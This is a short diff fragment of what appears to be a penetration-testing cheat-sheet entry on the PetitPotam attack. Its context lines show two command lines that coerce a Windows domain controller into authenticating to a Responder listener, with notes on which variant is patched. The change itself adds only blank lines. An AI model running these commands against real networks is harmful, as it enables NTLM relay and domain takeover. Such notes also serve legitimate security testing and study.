@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:35:59.630562+00:00'
 PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
 PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users
 ```
+
+
